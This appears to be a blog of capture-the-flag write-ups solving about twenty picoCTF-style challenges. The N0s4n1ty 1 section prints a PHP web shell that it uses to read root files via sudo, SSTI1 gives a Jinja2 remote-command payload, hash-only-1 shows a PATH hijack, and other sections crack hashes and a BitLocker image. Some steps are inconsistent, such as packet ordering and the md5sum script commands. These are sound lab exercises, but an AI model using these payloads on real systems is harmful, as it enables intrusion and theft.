<p>Open the packet capture provided with Wireshark.</p>
<p>The PDU data has been segmented into multiple TCP segments so if we follow the byte stream of the TCP segments we see a B64 encoded message: “bnRfdGg0dA==”.</p>
<p>You can then decode this using a tool like Cyber Chef to then find that it looks oddly like a flag.</p>
<p>If we take the hint and sort out the packets by time, you will see that the message starts at packet 20.</p>
<p>We can also infer that it&rsquo;s B64 encoded as every TCP payload following this packet contains “==”. By decoding each packet’s payload up until packet 7 we can get the flag.</p>
<h1 id="cookie-monster-secret-recipe">Cookie Monster Secret Recipe</h1>
<p>We can visit the website provided in the description and then open your browser&rsquo;s developer tools before attempting to log in.</p>
<p>In dev tools, go to the &ldquo;application&rdquo; tab and view your provided cookie. It should contain a <code>secret_recipe</code> value that you can then decode using Cyberchef, first use URL decoding and then Base64 decode.</p>
<p>You can tell it is URL encoded by its use of &ldquo;%&rdquo; signs to encode special characters.</p>
<h1 id="head-dump">Head-dump</h1>
<p>Visit the site instance provided in the challenge description. Then, on the site, click on the Documentation link on a post by &ldquo;John Doe&rdquo;, as you can see there is an endpoint at /heapdump that can be accessed through the browser.</p>
<p>Download the heap dump file and then use a tool like <a href="https://jsoneditoronline.org/">https://jsoneditoronline.org</a> and search for “pico” to find the flag.</p>
<h1 id="flag-hunters">Flag Hunters</h1>
<p>Once we connect to the program we can see it loops over and over showing user input.</p>
<p>Let’s analyse the python code using an IDE (I used VScode), on analysis (attach github repo with source code) we can see that the <code>lip</code> variable keeps track of the current line from the beginning (including secret section).</p>
<p>You may also notice that when we reach the return line on the first verse or chorus that is repeated, it returns to whatever number follows the return address.</p>
<p>This program now looks less like a song parser and more like an interpreter of a new programming language that includes flow control via jumps in the lines.</p>
<p>It does this using regular expressions to recognise strings that have the pattern “RETURN [0-9]+” but since there is no constraint on which line this string has to occurm, this control flow keyword can occur on any line.</p>
<p>The only condition is that it has to occur at the beginning of a line or following a “;” (since <code>for line in song\_lines\[lip\].split(‘;’):</code> splits by semi colons).</p>
<p>The program uses our input to change the following line in the hook: “CROWD” with &ldquo;Crowd: &lt;user input&gt;&rdquo;.</p>
<p>If we set the user input to “;RETURN 0” it will split the line on the semicolon and the RETURN will take us to line 0 which is located the secret text and we then find out flag by resuming running through the program.</p>
<h1 id="pie-time">PIE TIME</h1>
<p>Firstly the name gives us a big clue, and if we download both the source file and the server’s compiled binary we learn some things.</p>
<p>Running `checksec –file=vuln` we can see that PIE is enabled meaning the code can be leaded at any address each time it is run.</p>
<p>You can see this by repeatedly running the file and seeing the main address change.</p>
<p>Looking at the source code we can see that we want to jump to the address of the win function to get the flag.</p>
<p>Now we need to find the offset between the main address and win address in order to jump to the right address.</p>
<p>Lets compile the source code with debugging flags.</p>
<p>Now run the binary using gdb to find the addresses of both main and win at runtime and thus we can figure out the offset. If we run the program and set a breakpoint anywhere before the user input,  we can run print(&amp;main) and confirm that the output points to the right address and print(&amp;win) giving us the address of win. We can now continue the program and enter this to correctly jump to win locally.</p>
<p>If we try input this same win address the next time we run the program we will get a seg fault because the addresses are randomised on each run however the offsets are the same!</p>
<p>If we use the offset between the main address and win address and subtract that from the main address outputted (since main appears after win in the source file) then we can correctly find the win address on each run.</p>
<p>Let’s try this on the remote server… Oh no it doesn’t work. Why? Because the server is a different environment to your laptop and the binary you had compiled places functions at different offsets.</p>
<p>How can we work out the server’s offset well instead of finding the offset in your binary, find the offset in the binary file provided as this offset is the offset of the binary used by the server. Again, use gdb but don’t run the binary and by doing print(&amp;main) and print(&amp;win), we can subtract the values and work out the correct offset.</p>
<p>We then subtract this offset from the value of main’s address that the server displays and we get the flag!</p>
<h1 id="red">RED</h1>
<p>This one was pretty cool! So we are given an image called “red.png” as well as a description saying “RED, RED, RED, RED”.</p>
<p>First things first, when I see an image I run exiftool on it to find any metadata. Luckily we find a field in the metadata called “Poem” which goes as:</p>
<p>“Crimson heart, vibrant and bold,.Hearts flutter at your sight..Evenings glow softly red,.Cherries burst with sweet life..Kisses linger with your warmth..Love deep as merlot..Scarlet leaves falling softly,.Bold in every stroke.”</p>
<p>I was puzzled by this for a bit but then I noticed that if we take the capital letters of each sentence, we get “CHECKLSB” or check the least significant bit.</p>
<p>I have the perfect tool for this: `zsteg` and if we run `zsteg -a red.png` you will notice that the `b1,rgba,lsb,xy` that checks the least significant bit on the rgba channels has a familiar output. Seeing that it has the “==” symbols at the end, its probably a base-64 encoded string.</p>
<p>I then plugged it into cyberchef and hurray! I have the flag.</p>
<h1 id="rust-fixme-1">Rust fixme 1</h1>
<p>There are three simple errors in the Rust file:</p>
<ol>
<li>
<p>We end lines with “;”,</p>
</li>
<li>
<p>We can return using “return;”</p>
</li>
</ol>
<p>3). {} is used to enter variables into strings</p>
<p>Now run the rust file (`cargo build` then `cargo run`) and you should have the flag</p>
<h1 id="rust-fixme-2">Rust fixme 2</h1>
<p>There are another 3 simple errors:</p>
<p>1). Changeable parameters must be passed by a mutable reference and have their type set as &amp;mut</p>
<p>2). Mutable variables must be declared as mutable</p>
<p>3). The parameter passed in must be of type &amp;mut</p>
<h1 id="rust-fixme-3">Rust fixme 3</h1>
<p>Here we can read the documents and check rust documentation on how to notify the compiler to allow an unsafe operation by using the keyword `unsafe` and wrapping the unsafe function around curly braces as done here: `let decrypted_slice = unsafe {std::slice::from_raw_parts(decrypted_ptr, decrypted_len)};`</p>
<h1 id="hashcrack">Hashcrack</h1>
<p>First use netcat to connect to the remote server which will provide you with a hashed password.</p>
<p>We can then identify the hash considering the hash is 32 characters long (MD5 hashes are 128-bit) and consists of hexidecimal characters. It is probably an MD5 hash.</p>
<p>We can then use John The Ripper to crack the hash using the command `John &ndash;wordlist=/usr/share/wordlists/rockyou.txt &ndash;format=raw-md5 <!-- raw HTML omitted -->` this reveals the password to simply be “password123”</p>
<p>Next we get a hash is SHA-1 considering SHA-1 is 160-bits which is equivalent to 40 hex characters and the hash is 40 characters long.</p>
<p>Using John The Ripper again, ` John &ndash;wordlist=/usr/share/wordlists/rockyou.txt –format=sha-1 <!-- raw HTML omitted -->` we get the password as “letmein”.</p>
<p>The next hash we get is 64 hex characters long or a 256 bit hash which is indicative of SHA-256. Using John The Ripper again with the command `John &ndash;wordlist=/usr/share/wordlists/rockyou.txt –format=sha-256 <!-- raw HTML omitted -->`, we get the password as: “qwerty098” and we finally get the flag</p>
<h1 id="flags-are-stepic">flags are stepic</h1>
<p>I’m ashamed to admit how long this took me. I was quick to find the only flag that did not represent a country, which was Upanzi Republic. I then tried looking at the source html file for any clues and the downloaded the png image.</p>
<p>Due to my own negligence, I completely ignored the title and tried using stenography tools like binwalk and zsteg to find the hidden data.</p>
<p>Finally after looking back on the title, I realised I could use stepic with the command `stepic -d -i &lt;image_file&gt;` which produced the flag.</p>
<h1 id="n0s4n1ty-1">N0s4n1ty 1</h1>
<p>This challenge has gives you the ability to upload files to a webserver. First I uploaded a normal png image which worked and I was able to view it by visiting “/uploads/<!-- raw HTML omitted -->.png”. I then tried uploading different file formats (including php) and saw that there was no file sanitisation.</p>
<p>Now I had to check if the server would interpret and run my php file so I quickly created a php file with the body: `<!-- raw HTML omitted -->` and luckily the server ran the code. Great!</p>
<p>Now I went straight to over complicating it and crafting a php reverse shell file using msfvenom and meterpreter however I couldn’t get the listener to catch the connection initiation.</p>
<p>I decided to go back to basics and wrote a quick small php script: `&lt;?php</p>
<p>if (isset($_GET[&lsquo;cmd&rsquo;])) {</p>
<p>    system($_GET[&lsquo;cmd&rsquo;]);</p>
<p>}</p>
<p>?&gt;` this would check if the `cmd` parameter is passed in the URL by doing `?cmd=` after entering the file path into the URL and then would use the server’s OS to execute the cmd passed into the `cmd` paramter.</p>
<p>Then if I passed `?cmd=sudo -l` it shows that the user “www—data” had full sudo privileges without a password allowing me to access the `/root` directory and retrieve the flag by running the command `?cmd=sudo cat /root/flag.txt` which then printed the flag.</p>
<h1 id="hash-only-1">hash-only-1</h1>
<p>We are given a host to ssh to and the password. Upon establishing an authorised, secure connection, we can run `ls` to see a `flaghasher` file. If we run `file flaghasher` we can se that it is a binary.</p>
<p>Let’s run the binary, it returns the MD5 hash of the flag and shows us the location of the flag. Perhaps we can simply navigate and `cat` the flag file. Unfortunately we don’t have  permissions.</p>
<p>Instead, let’s try something a little more complex. After some thought, I realised the `flaghasher` binary might be calling the `md5sum` command to compute the hash of the file.</p>
<p>Let’s create a script that changes what this command does:</p>
<p>`#!/bin/sh cat &ldquo;$1&rdquo;`</p>
<p>this script simply runs `cat` on the first argument.</p>
<p>Now to create the script we don’t have vim or nano but we can always rely on echo and run the commands: `echo &lsquo;#!/bin/sh&rsquo; &gt; /tmp/md5sum` and `echo &lsquo;#!/bin/sh&rsquo; &gt; md5sum`.</p>
<p>Now that we have our script created, let’s make it executable with `chmod +x md5sum` and finally prepending it to the beginning of our PATH environment variable by doing `export PATH=.:$PATH`. Now if we run `flaghasher` it will call `md5sum` and since it doesn’t specify the full path, the system uses the first `md5sum` in its `PATH` and runs our script.</p>
<p>This is called a PATH manipulation attack.</p>
<h1 id="ssti1">SSTI1</h1>
<p>This provides us with a website to visit that renders a new page with whatever input you type in.</p>
<p>Considering the name is “SSTI” we will try Server Side Template Injection. First we can run `{{ 7 * 7 }}` to see if it works and it does we get a page with 49 on it.</p>
<p>We can now pass in the following payload (assuming the templates are in Jinja2):</p>
<p>{{ self.__init__.__globals__.__builtins__.__import__(&lsquo;os&rsquo;).popen(&lsquo;ls&rsquo;).read() }}</p>
<p>self refers to the current template Jinja2 object, __init__ allows us to access the object’s initialization context (including global variables), __globals__ is a dictionary containing the global variables used to access Python’s built-in functions, __builtins__ is a module that contains Python’s built in functions and then we can run the built-in function `__import__` to import the `os` module to interact with the operating system.</p>
<p>`popen` is a method in the `os` module that opens a pipe from a shell command which we can then read.</p>
<p>This then returns a page of files in the current working directory of the host which contains: “__pycache__ app.py flag requirements.txt”. We can then run the following payload:</p>
<p>{{ self.__init__.__globals__.__builtins__.__import__(&lsquo;os&rsquo;).popen(&lsquo;cat flag&rsquo;).read() }}</p>
<p>to return the contents of the flag file.</p>
<p>Binary Instrumentation 1</p>
<p>For this challenge I took the hint and used `pipx` to install frida</p>
<h1 id="tap-into-hash">Tap into Hash</h1>
<p>This CTF taught me how the block chain works.</p>
<p>This one was quite fun apart from me debugging for 30 minutes to then realize that the key in the file is the key before it was hashed and I needed to hash it first.</p>
<p>Nevertheless, you are provided with a source file running through a block chain algorithm that prints a key as well as the encrypted blockchain hash.</p>
<p>There is another file containing a key and encrypted blockchain hash we must decrypt.</p>
<p>Running through the source file, the important functions are `encrypt`, `pad` and `xor_bytes`.</p>
<p>If we walk through the encrypt process we can see that we first need to decrypt the encrypted blockchain by hashing the key from the flag file and using a similar process to XOR it with every 16 byte block in the encrypted data (this is because XOR is involutive and applying it twice simply undoes it). We can now try to decode and print the decrypted hash but it fails because there is padding.</p>
<p>So we need to remove the padding, luckily the padding uses the length of the padding as the value to pad with so if we take the last byte and remove that many bytes from the end of the decrypted hash, the padding is removed and we can decode and print the hash. The flag can be found in the middle of the hash.</p>
<h1 id="even-rsa-can-be-broken">EVEN RSA CAN BE BROKEN???</h1>
<p>For this challenge, we can use the hints to see that the prime numbers generated aren’t truly random.</p>
<p>Looking at the encrypt.py source code we can see the public and private key generation process. `p` and `q` are obtained by a mysterious `get_primes` function where both are half of the length of the key. The private key is then generated using the modular inverse of e modulo (p-1)*(q-1) – known as Euler’s totient function.</p>
<p>The plaintext is then encrypted by modularly raising m to the power of e modulus N.</p>
<p>The plaintext in this case is the flag.</p>
<p>If we run connect to the server multiple times we can see that N isn’t truly random and shares a GCD of 2 between all Ns. This suggests either p or q is always set to 2. Knowing this we can create a python script that uses the N, the ciphertext, sets p as 2 and q as `N//p`. We can then generate the private key using the same process in the encrypt.py file where e = 65537 and decrypt the text by raising it to the modular power of d modulo N.</p>
<p>Then we can convert the decrypted message from a long integer to bytes and then decode it into a string we can print.</p>
<h1 id="bitlocker-1">Bitlocker-1</h1>
<p>The challenge mentions a user “Jacky” using a simple password to encrypt their bitlocker drive, for which we can install the image using the link.</p>
<p>This provides us with a `.dd` file or disk image file (a byte-for-byte copy of the storage device)</p>
<p>It is quite clear we will need to decrypt this bitlocker disk image and a great tool to use would be John The Ripper.</p>
<p>We can then use the subtool bitlocker2john <!-- raw HTML omitted --> which produces the output:</p>

<p>```</p>
<p>We know that the user’s password is what we want to crack so we can simply copy and paste it into a text file:</p>
<p>```</p>
<p>$bitlocker$0$16$cb4809fe9628471a411f8380e0f668db$1048576$12$d04d9c58eed6da010a000000$60$68156e51e53f0a01c076a32ba2b2999afffce8530fbe5d84b4c19ac71f6c79375b87d40c2d871ed2b7b5559d71ba31b6779c6f41412fd6869442d66d</p>
<p>```</p>
<p>Then you can use the command `./john &ndash;format=bitlocker –wordlist=<!-- raw HTML omitted --> bitlocker.txt` to crack the bitlocker password using the wordlist of your choice. After a little while, the password is cracked and is: “jacqueline”</p>
<p>Now we need to decrypt and mount the drive, lets create a mount point using `sudo mkdir -p /mnt/bitlocker`.</p>
<p>I then used the dislocker tool to mount the bitlocker and decrypt the bitlocker drive `sudo dislocker -V bitlocker-1.dd -ujacqueline &ndash; /mnt/bitlocker`, this will unlock the bitlocker volume using jacqueline as the password and mount it on /mnt/bitlocker.</p>
<p>Now we can mount the file as if it were a disk using the command `sudo mount -o loop,ro /mnt/bitlocker/dislocker-file /mnt/bitlocker` this will mount it as if it were a physical read-only disk allowing access in the bitlocker mountpoint.</p>
<p>We can then run `cd /mnt/bitlocker` to find the flag.txt file that we can then `cat`.</p>
